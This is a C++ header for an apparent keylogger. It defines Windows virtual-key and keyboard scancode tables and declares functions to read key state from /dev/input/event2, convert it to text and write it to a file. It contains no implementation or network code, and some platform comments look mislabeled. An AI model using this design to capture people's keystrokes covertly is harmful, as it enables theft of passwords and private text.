#ifndef KEYLOG_H
#define KEYLOG_H

#include <vector>
#include <string>

// Definitely Windows specific
enum class vcodes {BACK = 0x08, TAB, CLEAR = 0x0C, RETURN, SHIFT = 0x10, CONTROL,
    MENU, PAUSE, CAPITAL, ESCAPE = 0x1B, SPACE = 0x20, PRIOR, NEXT, END,
    HOME, LEFT, UP, RIGHT, DOWN, SELECT, PRINT, EXECUTE, SNAPSHOT,
    INSERT, DELETE_KEY, HELP, NUM_0, NUM_1, NUM_2, NUM_3, NUM_4, NUM_5, NUM_6, NUM_7, NUM_8, NUM_9,
    A = 0x41, B, C, D, E, F, G, H, I, J, K, L, M, N,
    O, P, Q, R, S, T, U, V, W, X, Y, Z, LWIN, RWIN,
    APPS, SLEEP = 0x5F, NUMPAD0, NUMPAD1, NUMPAD2, NUMPAD3, NUMPAD4,
    NUMPAD5, NUMPAD6, NUMPAD7, NUMPAD8, NUMPAD9, MULTIPLY, ADD,
    SEPARATOR, SUBTRACT, DECIMAL, DIVIDE, OEM_1 = 0xBA /*';:'*/,
    OEM_PLUS /*'+'*/, OEM_COMMA /*','*/, OEM_MINUS /*'-'*/, OEM_PERIOD /*'.'*/,
    OEM_2 /*'/?'*/, OEM_3 /*'`~'*/, OEM_4 = 0xDB /*'[{'*/, OEM_5 /*'\|'*/,
    OEM_6 /*']}'*/, OEM_7 /*''"'*/, OEM_8 /*'IDK'*/, OEM_CLEAR = 0xFE, REAL_END};

 // Definitely Linux specific
 enum class set3 {BACK = 0x66, TAB = 0x0D, RETURN = 0x5A, LSHIFT = 0x12, RSHIFT = 0x59,
    LCONTROL = 0x11, RCONTROL = 0x14, LALT = 0x19, RALT = 0x39, PAUSE = 0x62,
    CAPITAL = 0x58, ESCAPE = 0x08, SPACE = 0x29, END = 0x65, HOME = 0x6E,
    LEFT = 0x61, UP = 0x63, RIGHT = 0x6A, DOWN = 0x6D, PRINT = 0x57,
    INSERT = 0x67, DELETE_KEY = 0x64, NUM_0 = 0x45, NUM_1 = 0x16, NUM_2 = 0x1E, NUM_3 = 0x26,
    NUM_4 = 0x25, NUM_5 = 0x2E, NUM_6 = 0x36, NUM_7 = 0x3D, NUM_8 = 0x3E, NUM_9 = 0x46, A = 0x1C,
    B = 0x32, C = 0x21, D = 0x23, E = 0x24, F = 0x2B, G = 0x34, H = 0x33,
    I = 0x43, J = 0x3B, K = 0x42, L = 0x4B, M = 0x3A, N = 0x31, O = 0x44,
    P = 0x4D, Q = 0x15, R = 0x2D, S = 0x1B, T = 0x2C, U = 0x3C, V = 0x2A,
    W = 0x1D, X = 0x22, Y = 0x35, Z = 0x1A, NUMPAD0 = 0x70, NUMPAD1 = 0x69,
    NUMPAD2 = 0x72, NUMPAD3 = 0x7A, NUMPAD4 = 0x6B, NUMPAD5 = 0x73,
    NUMPAD6 = 0x74, NUMPAD7 = 0x6C, NUMPAD8 = 0x75, NUMPAD9 = 0x7D,
    MULTIPLY = 0x7E, ADD = 0x7C, SEPARATOR = 0x53, SUBTRACT = 0x84,
    DECIMAL = 0x71, DIVIDE = 0x77, OEM_1 = 0x4C /*';:'*/, OEM_PLUS = 0x55/*'+'*/,
    OEM_COMMA = 0x41/*','*/, OEM_MINUS = 0x4E/*'-'*/, OEM_PERIOD = 0x49/*'.'*/,
    OEM_2  = 0x4A/*'/?'*/, OEM_3 = 0x0E/*'`~'*/, OEM_4 = 0x54 /*'[{'*/,
    OEM_5 = 0x5C/*'\|'*/, OEM_6 = 0x5B/*']}'*/, OEM_7 = 0x52/*''"'*/,
    OEM_8 = 0x00/*'IDK'*/};

enum class set1 {BACK = 0x0E, TAB = 0x0F, RETURN = 0x1C, LSHIFT = 0x2A, RSHIFT = 0x36,
    RCONTROL = 0xE01D, LCONTROL = 0x1d, LALT = 0x38, RALT = 0xE038,  PAUSE = 0xE11D45,
    CAPITAL = 0x3A, ESCAPE = 0x01, SPACE = 0x39, END = 0xE04F, HOME = 0xE047,
    LEFT = 0xE04B, UP = 0xE049, RIGHT = 0xE04D, DOWN = 0xE050, PRINT = 0xE037,
    INSERT = 0xE052, DELETE_KEY = 0xE053, NUM_1 = 0x02, NUM_2, NUM_3, NUM_4, NUM_5, NUM_6, NUM_7,
    NUM_8, NUM_9, NUM_0, A = 0x1E,
    B = 0x30, C = 0x2E, D = 0x20, E = 0x12, F = 0x21, G, H,
    I = 0x17, J = 0x24, K, L, M = 0x32, N = 0x31, O = 0x18,
    P, Q = 0x10, R = 0x13, S = 0x1F, T = 0x14, U = 0x16, V = 0x2F,
    W = 0x11, X = 0x2D, Y = 0x15, Z = 0x2C, NUMPAD0 = 0x52, NUMPAD1 = 0x4F,
    NUMPAD2 = 0x50, NUMPAD3, NUMPAD4 = 0x4B, NUMPAD5, NUMPAD6, NUMPAD7 = 0x47,
    NUMPAD8, NUMPAD9, MULTIPLY = 0x37, ADD = 0x4E, SEPARATOR = 0xE05F, SUBTRACT = 0x4A,
    DECIMAL = 0x53, DIVIDE = 0xE035, OEM_1 = 0x27 /*';:'*/, OEM_PLUS = 0x0D/*'+'*/,
    OEM_COMMA = 0x33/*','*/, OEM_MINUS = 0x0C/*'-'*/, OEM_PERIOD = 0x34/*'.'*/,
    OEM_2 /*'/?'*/, OEM_3 = 0x29/*'`~'*/, OEM_4 = 0x1A /*'[{'*/,
    OEM_5 = 0x2B/*'\|'*/, OEM_6 = 0x1B/*']}'*/, OEM_7 = 0x28/*''"'*/,
    OEM_8 = 0x00/*'IDK'*/};


// Maybe Windows specific


std::vector<vcodes> getPressedKeyboardState(std::string path = "/dev/input/event2");
std::string getAscii(std::vector<vcodes>);

// Generic
void writeToFile(std::string, std::string);

#endif